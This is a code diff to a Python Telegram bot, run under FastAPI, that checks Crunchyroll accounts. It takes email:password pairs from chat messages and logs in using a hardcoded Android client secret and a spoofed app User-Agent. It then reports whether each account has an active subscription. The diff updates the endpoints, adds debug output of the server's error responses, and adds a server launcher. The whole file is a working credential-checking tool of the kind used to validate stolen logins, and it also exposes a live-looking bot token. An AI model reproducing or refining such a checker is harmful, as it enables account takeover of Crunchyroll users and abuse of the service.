@@ -4,41 +4,49 @@ import telebot
 import requests
 
 # ========================== PUT YOUR TELEGRAM BOT TOKEN HERE ==========================
-BOT_TOKEN = '8704844082:AAGJYybxhWMugb6oiL3ZglL4K2xvtEd7cVI'   # ←←←←←←←←←←←←←←←←←←←←←←←←←←←← REPLACE WITH YOUR REAL TOKEN
+BOT_TOKEN = '8704844082:AAGJYybxhWMugb6oiL3ZglL4K2xvtEd7cVI'  # ←←←←←←←←←←←←←←←←←←←←←←←←←←←← REPLACE WITH YOUR REAL TOKEN
 
-# ========================== CRUNCHYROLL CHECKER ==========================
+# ========================== IMPROVED CRUNCHYROLL CHECKER (with debug) ==========================
 def check_crunchyroll(email: str, password: str) -> str:
     try:
+        # Updated endpoint (www instead of beta-api) + better headers
         login_resp = requests.post(
-            'https://beta-api.crunchyroll.com/auth/v1/token',
+            'https://www.crunchyroll.com/auth/v1/token',
             data={
                 'username': email,
                 'password': password,
                 'grant_type': 'password',
                 'scope': 'offline_access'
             },
-            headers={'User-Agent': 'Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1'},
+            headers={
+                'User-Agent': 'Crunchyroll/3.90.0 Android/14 okhttp/4.12.1',
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
             auth=('cr_android', '1cf35dc5-b286-4551-8835-d4b1b4258445')
         )
 
+        # === DEBUG: Show exact error from Crunchyroll ===
         if login_resp.status_code != 200:
-            return "❌ Invalid email or password"
+            error_text = login_resp.text[:300]  # first 300 chars
+            return f"❌ Login failed\nStatus: {login_resp.status_code}\nResponse: {error_text}"
 
         token = login_resp.json().get('access_token')
 
+        # 2. Get external_id
         profile_resp = requests.get(
-            'https://beta-api.crunchyroll.com/accounts/v1/me',
+            'https://www.crunchyroll.com/accounts/v1/me',
             headers={
-                'User-Agent': 'Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1',
+                'User-Agent': 'Crunchyroll/3.90.0 Android/14 okhttp/4.12.1',
                 'Authorization': f'Bearer {token}'
             }
         )
         external_id = profile_resp.json().get('external_id')
 
+        # 3. Check subscription
         sub_resp = requests.get(
-            f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits',
+            f'https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits',
             headers={
-                'User-Agent': 'Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1',
+                'User-Agent': 'Crunchyroll/3.90.0 Android/14 okhttp/4.12.1',
                 'Authorization': f'Bearer {token}'
             }
         )
@@ -53,7 +61,7 @@ def check_crunchyroll(email: str, password: str) -> str:
             return "🔴 No active subscription"
 
     except Exception as e:
-        return f"❌ Error occurred: {str(e)}"
+        return f"❌ Unexpected error: {str(e)}"
 
 
 # ========================== FASTAPI + TELEGRAM ==========================
@@ -71,7 +79,7 @@ async def telegram_webhook(request: Request):
 
 @app.get("/")
 async def root():
-    return {"message": "✅ Crunchyroll Checker Bot is running with FastAPI + Uvicorn"}
+    return {"message": "✅ Crunchyroll Checker Bot is running (FastAPI + Uvicorn)"}
 
 
 # ========================== MESSAGE HANDLERS ==========================
@@ -110,3 +118,11 @@ def handle_credentials(message):
 
     except Exception:
         bot.reply_to(message, "❌ Invalid format.\nPlease send exactly like: `email:password`")
+
+
+# ========================== START SERVER ==========================
+if __name__ == "__main__":
+    import uvicorn
+    port = int(os.environ.get("PORT", 5000))
+    print(f"🚀 Starting on port {port}")
+    uvicorn.run(app, host="0.0.0.0", port=port)
